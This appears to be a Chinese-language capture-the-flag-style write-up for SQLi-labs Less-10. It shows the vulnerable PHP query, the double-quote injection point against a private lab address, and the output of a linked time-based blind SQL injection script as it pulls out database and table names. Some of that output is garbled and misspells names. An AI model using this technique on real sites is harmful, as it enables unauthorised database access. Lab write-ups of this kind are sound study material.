---
title: less10
url: https://www.yuque.com/u29002979/ep2zrx/uzyohqth1n60nyp0
---

```bash
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

双引号闭合

`?id=1"`显示You are in...........
`?id=1"`也显示You are in...........

与Less9的区别在于闭合方式为 双引号，
同样是时间盲注

<a name="WFWr1"></a>

# 使用python时间盲注脚本

[time-blind.py](https://www.yuque.com/attachments/yuque/0/2022/py/29430497/1668822269804-e683f9ad-2d5c-4eda-bfe6-cdc0578a20b1.py?_lake_card=%7B%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2022%2Fpy%2F29430497%2F1668822269804-e683f9ad-2d5c-4eda-bfe6-cdc0578a20b1.py%22%2C%22name%22%3A%22time-blind.py%22%2C%22size%22%3A3709%2C%22type%22%3A%22text%2Fx-python%22%2C%22ext%22%3A%22py%22%2C%22source%22%3A%22%22%2C%22status%22%3A%22done%22%2C%22mode%22%3A%22title%22%2C%22download%22%3Atrue%2C%22taskId%22%3A%22uccc0b203-7879-4264-955e-69651a58aa2%22%2C%22taskType%22%3A%22upload%22%2C%22__spacing%22%3A%22both%22%2C%22id%22%3A%22ua027682d%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22card%22%3A%22file%22%7D)

> url = 'http://192.168.31.193/Less-10/?id=1"'

```bash
┌──(root㉿guoyx)-[/home/kali/sql-python]
└─# python3 time-blind.py 
数据库名为->s
数据库名为->se
数据库名为->sec
数据库名为->secu
数据库名为->secur
数据库名为->secur
数据库名为->securt
数据库名为->securty
第一个表为->e
第一个表为->em
第一个表为->ema
第一个表为->emai
第二个表为->f
第二个表为->fe
第三个表为->s
字段二为->H
字段二为->H*
```

数据库名为securty
